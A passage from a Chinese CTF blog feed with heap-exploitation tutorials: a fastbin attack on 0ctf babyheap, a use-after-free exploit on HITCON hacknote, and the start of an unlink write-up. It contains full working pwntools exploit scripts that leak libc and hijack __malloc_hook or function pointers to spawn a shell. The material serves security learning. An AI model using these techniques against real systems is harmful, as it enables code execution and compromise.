class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"> </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"> </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x55db5f3d4290</span><br><span class="line">0x55db5f3d4290:0x00000000000000000x0000000000000021</span><br><span class="line">0x55db5f3d42a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55db5f3d42b0:0x00000000000000000x0000000000000021</span><br><span class="line">0x55db5f3d42c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55db5f3d42d0:0x00000000000000000x0000000000000021</span><br><span class="line">0x55db5f3d42e0:0x000055db5f3d42800x000055db5f3d4010 --+ chunk2</span><br><span class="line">0x55db5f3d42f0:0x00000000000000000x0000000000000021   |</span><br><span class="line">0x55db5f3d4300:0x00000000000000000x0000000000000000   |</span><br><span class="line">0x55db5f3d4310:0x00000000000000000x0000000000000021 &lt;-+ chunk4</span><br><span class="line">0x55db5f3d4320:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到 index[2] 存放的是 small chunk 的地址，此时将 small chunk 的 size 改写回来，将其释放掉就可以 dump 出来了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">main_arena = unsortedbin_addr - offset_unsortedbin_main_arena</span><br><span class="line">log.success(<span class="string">'main arena addr: '</span> + hex(main_arena))</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br></pre></td></tr></table></figure><p>main_arena_offset脚本 <a href="https://github.com/bash-c/main_arena_offset" target="_blank" rel="noopener">https://github.com/bash-c/main_arena_offset</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bash main_arena ./x64_libc.so.6 </span><br><span class="line">[+]libc version : glibc 2.23</span><br><span class="line">[+]build ID : BuildID[sha1]=b5381a457906d279073822a5ceb24c4bfef94ddb</span><br><span class="line">[+]main_arena_offset : 0x3c4b20</span><br></pre></td></tr></table></figure><h4 id="分配-chunk-到-malloc-hook-附近"><a href="#分配-chunk-到-malloc-hook-附近" class="headerlink" title="分配 chunk 到 malloc_hook 附近"></a>分配 chunk 到 malloc_hook 附近</h4><p>由于 malloc hook 附近的 chunk 大小为 0x7f，所以数据区域为 0x60。这里我们再次申请的时候，对应 fastbin 链表中没有相应大小 chunk，所以根据堆分配器规则，它会依次处理 unsorted bin 中的 chunk，将其放入到对应的 bin 中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以可以从其前面分割出来一块。所以 idx2 仍然指向该位置，那么我们可以使用类似的办法先释放申请到的 chunk，然后再次修改 fd 指针为 fake chunk 即可。此后我们修改 malloc_hook 处的指针即可得到触发 onegadget。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32xw (long long)(&amp;main_arena)-0x40</span><br><span class="line">0x7fa8a92a6b40 &lt;_IO_wide_data_0+224&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6b50 &lt;_IO_wide_data_0+240&gt;:0xa92a7f600x00007fa80x000000000x00000000</span><br><span class="line">0x7fa8a92a6b60 &lt;__memalign_hook&gt;:0xa91595a00x00007fa80xa9159c200x00007fa8</span><br><span class="line">0x7fa8a92a6b70 &lt;__malloc_hook&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6b80 &lt;main_arena&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6b90 &lt;main_arena+16&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6ba0 &lt;main_arena+32&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6bb0 &lt;main_arena+48&gt;:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># edit idx4's fd point to fake chunk</span></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>, len(fake_chunk), fake_chunk)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 6</span></span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">'a'</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"><span class="comment"># trigger malloc_hook</span></span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">'./babyheap_0ctf_2017'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(payload)))</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. leak libc base</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(unsortedbin_addr)</span><br><span class="line">main_arena = unsortedbin_addr - offset_bin_main_arena(<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">'main arena addr: '</span> + hex(main_arena))</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># edit idx4's fd point to fake chunk</span></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">log.success(hex(fake_chunk_addr))</span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,  fake_chunk)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 6</span></span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">'a'</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>,  payload)</span><br><span class="line"><span class="comment"># trigger malloc_hook</span></span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Fastbin Attack/">https://kabeor.github.io/堆溢出-Fastbin Attack/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Fastbin-Attack&quot;&gt;&lt;a href=&quot;#堆溢出-Fastbin-Attack&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Fastbin Attack&quot;&gt;&lt;/a&gt;堆溢出-Fastbin Attack&lt;/h1&gt;&lt;h2 id=&quot;原
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Use After Free</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Use%20After%20Free/"/>
    <id>https://kabeor.github.io/堆溢出-Use After Free/</id>
    <published>2020-01-06T04:21:43.321Z</published>
    <updated>2020-01-06T04:24:23.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Use-After-Free"><a href="#堆溢出-Use-After-Free" class="headerlink" title="堆溢出-Use After Free"></a>堆溢出-Use After Free</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当一个内存块被释放之后再次被使用。</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p><strong>一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><h2 id="例-HITCON-training-lab-10-hacknote"><a href="#例-HITCON-training-lab-10-hacknote" class="headerlink" title="例 HITCON-training lab 10 hacknote"></a>例 HITCON-training lab 10 hacknote</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"       HackNote       "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 1. Add note          "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 2. Delete note       "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 3. Print note        "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 4. Exit              "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"----------------------"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));         <span class="comment">////////////free后指针没有设为NULL</span></span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>申请一个size=16的note查看堆布局</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x804b198</span><br><span class="line">0x804b198:0x00000011000000000x0804b1b00804865b  ========&gt; 8 字节内存存放note中的put以及content指针。</span><br><span class="line">0x804b1a8:0x00000021000000000x6161616161616161</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00021e39000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>释放 note0</li><li>释放 note1</li><li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li><li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li><li>note2 其实会分配 note1 对应的内存块。</li><li>real content 对应的 chunk 其实是 note0。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">释放note 0 - note 1后</span><br><span class="line">pwndbg&gt; x/20gx 0x804b198-0x10</span><br><span class="line">0x804b188:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b198:0x00000011000000000x0804b01000000000  ---------再次申请将被分配</span><br><span class="line">0x804b1a8:0x00000021000000000x0804b01000000000</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00000011000000000x0804b0100804b1a0</span><br><span class="line">0x804b1d8:0x00000021000000000x0804b0100804b1b0</span><br><span class="line">0x804b1e8:0x62626262626262620x0000000000000000</span><br><span class="line">0x804b1f8:0x00021e09000000000x0000000000000000</span><br><span class="line">0x804b208:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b218:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">note2填充&apos;c&apos;*8后</span><br><span class="line">pwndbg&gt; x/20gx 0x804b198-0x20</span><br><span class="line">0x804b178:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b188:0x00000000000000000x0000000000000000</span><br><span class="line">0x804b198:0x00000011000000000x6363636363636363  ------分配位置，将被调用，改为magic地址get shell</span><br><span class="line">0x804b1a8:0x00000021000000000x0804b01000000000</span><br><span class="line">0x804b1b8:0x61616161616161610x0000000000000000</span><br><span class="line">0x804b1c8:0x00000011000000000x0804b1a00804865b</span><br><span class="line">0x804b1d8:0x00000021000000000x0804b0100804b1b0</span><br><span class="line">0x804b1e8:0x62626262626262620x0000000000000000</span><br><span class="line">0x804b1f8:0x00021e09000000000x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Use After Free/">https://kabeor.github.io/堆溢出-Use After Free/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Use-After-Free&quot;&gt;&lt;a href=&quot;#堆溢出-Use-After-Free&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Use After Free&quot;&gt;&lt;/a&gt;堆溢出-Use After Free&lt;/h1&gt;&lt;h2 id=&quot;原
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Unlink</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Unlink/"/>
    <id>https://kabeor.github.io/堆溢出-Unlink/</id>
    <published>2020-01-05T13:25:57.021Z</published>
    <updated>2020-01-06T04:24:23.069Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Unlink"><a href="#堆溢出-Unlink" class="headerlink" title="堆溢出-Unlink"></a>堆溢出-Unlink</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://i.loli.net/2020/01/05/rsipB2cPVI7lFtv.png" alt></p><p>对 fd 和 bk 的检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对 fd 和 bk 的检查</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure><p>通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><p>64位：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd = &amp;P-0x18</span><br><span class="line">bk = &amp;P-0x10</span><br><span class="line">效果： P = &amp;P-0X18</span><br></pre></td></tr></table></figure><p>32 位</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd = &amp;p-12</span><br><span class="line">bk = &amp;p-8</span><br><span class="line">效果: p =&amp;p-12</span><br></pre></td></tr></table></figure><h2 id="例-2016-ZCTF-note2"><a href="#例-2016-ZCTF-note2" class="headerlink" title="例 2016 ZCTF note2"></a>例 2016 ZCTF note2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">功能</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1.New note\n2.Show  note\n3.Edit note\n4.Delete note\n5.Quit\noption---&gt;&gt;"</span>);</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">新建note</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400B96</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *size_4; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_602160 &gt; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"note lists are full"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the length of the note content:(less than 128)"</span>);</span><br><span class="line">  size = sub_400A4A(<span class="string">"Input the length of the note content:(less than 128)"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x80</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too long"</span>);</span><br><span class="line">  size_4 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the note content:"</span>);</span><br><span class="line">  sub_4009BD(size_4, size, <span class="number">10</span>);         <span class="comment">////////////读取函数，漏洞点</span></span><br><span class="line">  sub_400B10(size_4);</span><br><span class="line">  *(&amp;ptr + dword_602160) = size_4;</span><br><span class="line">  qword_602140[dword_602160] = size;</span><br><span class="line">  v2 = dword_602160++;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"note add success, the id is %d\n"</span>, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4009BD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span 